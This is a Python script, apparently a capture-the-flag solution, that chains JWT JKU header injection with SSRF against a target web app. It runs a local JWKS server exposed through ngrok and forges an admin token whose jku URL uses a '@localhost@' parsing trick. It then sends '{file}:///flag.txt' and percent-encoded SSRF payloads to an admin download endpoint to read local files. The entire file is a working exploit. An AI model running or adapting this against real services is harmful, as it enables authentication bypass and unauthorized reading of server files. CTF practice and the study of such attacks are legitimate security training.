#!/usr/bin/env python3
import jwt
import json
import base64
import requests
import threading
import sys
import time
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
NGROK_DOMAIN = sys.argv[2] if len(sys.argv) > 2 else input("Enter your ngrok domain (e.g. abc123.ngrok-free.app): ").strip()
NGROK_DOMAIN = NGROK_DOMAIN.replace('https://', '').replace('http://', '')
LOCAL_PORT = 9000
JWKS_DATA = {}

class JWKSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/jwks.json':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(JWKS_DATA).encode())
            print(f" [JWKS Server] Served to {self.client_address[0]}")
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, *args): pass

def generate_keys():
    print("[1] Generating RSA keypair...")
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    pub_numbers = private_key.public_key().public_numbers()
    def to_b64(n):
        b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
        return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
    jwks = {"keys": [{"kty":"RSA","kid":"key1","use":"sig","alg":"RS256",
                       "n": to_b64(pub_numbers.n), "e": to_b64(pub_numbers.e)}]}
    with open('jwks.json', 'w') as f:
        json.dump(jwks, f, indent=2)
    print(" âœ“ jwks.json saved")
    return private_pem, jwks

def start_server(jwks):
    global JWKS_DATA
    JWKS_DATA = jwks
    server = HTTPServer(('0.0.0.0', LOCAL_PORT), JWKSHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[2] JWKS server running on port {LOCAL_PORT}")
    print(f" Endpoint: https://{NGROK_DOMAIN}/jwks.json")
    return server

def forge_jwt(private_pem):
    print("[3] Forging admin JWT...")
    jku = f"https://{NGROK_DOMAIN}@localhost@{NGROK_DOMAIN}/jwks.json"
    payload = {
        'user_id': 1,
        'username': 'admin',
        'is_admin': True,
        'exp': datetime.utcnow() + timedelta(hours=24),
        'jku': jku
    }
    token = jwt.encode(payload, private_pem, algorithm='RS256', headers={'kid': 'key1'})
    print(f" JKU: {jku}")
    print(f"\n{'='*70}")
    print("FORGED ADMIN TOKEN:")
    print(f"{token}")
    print(f"{'='*70}\n")
   
    with open('admin_token.txt', 'w') as f:
        f.write(token)
    print(" âœ“ Token saved to admin_token.txt\n")
   
    return token

def get_flag(token):
    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
    print("[4] Verifying admin access...")
    r = requests.get(f"{TARGET_URL}/api/admin/settings", headers=headers)
    if r.status_code != 200:
        print(f" âœ— FAILED ({r.status_code}): {r.text}")
        return
    print(" âœ“ Admin access confirmed!")
    ssrf_payloads = [
        ("{file}:///flag.txt", "image"),
        ("{file}:///flag.txt", "text"),
        ("file:///flag.txt", "text"),
        ("%66ile:///flag.txt", "text"),
        ("fi%6ce:///flag.txt", "text"),
        ("{file}:///app/flag.txt", "image"),
    ]
    print("[5] Trying SSRF payloads...")
    succeeded = False
    for payload, file_type in ssrf_payloads:
        print(f" Trying: {payload} (type={file_type})")
        r = requests.post(f"{TARGET_URL}/api/admin/download", headers=headers, json={
            "url": payload,
            "filename": "flag.txt",
            "title": "Flag",
            "type": file_type
        })
        if r.status_code == 200:
            print(f" âœ“ SUCCESS with: {payload}")
            succeeded = True
            break
        else:
            try:
                msg = r.json().get('message', r.text)
            except:
                msg = r.text
            print(f" âœ— {r.status_code}: {msg}")
    if not succeeded:
        print("\n All payloads failed.")
        return
    print("[6] Fetching flag...")
    r = requests.get(f"{TARGET_URL}/static/flag.txt")
    if r.status_code == 200:
        flag_text = r.text.strip()
        print(f"\n{'='*70}")
        print(f" ðŸš©ðŸš©ðŸš© FLAG CAPTURED! ðŸš©ðŸš©ðŸš©")
        print(f"{'='*70}")
        print(f" {flag_text}")
        print(f"{'='*70}")
        print(f"\n Exploit: JKU Injection + {{file}} Template Bypass")
        print(f" Payload: {{file}}:///flag.txt with type='image'")
        print(f"{'='*70}\n")
    else:
        print(f" âœ— Could not fetch flag: {r.status_code}")

if __name__ == "__main__":
    print(f"\n{'='*70}")
    print(f" CTF Exploit - JKU Injection + SSRF")
    print(f"{'='*70}")
    print(f"Target: {TARGET_URL}")
    print(f"Ngrok: https://{NGROK_DOMAIN}")
    print(f"{'='*70}\n")
    private_pem, jwks = generate_keys()
    server = start_server(jwks)
    time.sleep(1)
    token = forge_jwt(private_pem)
    get_flag(token)
   
    print("\n" + "="*70)
    print(" JWKS Server is still running for manual testing...")
    print(" Test at: https://{}/jwks.json".format(NGROK_DOMAIN))
    print(" Token saved in: admin_token.txt")
    print(" Press Ctrl+C to stop the server")
    print("="*70 + "\n")
   
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\nâœ“ Server stopped. Goodbye!")
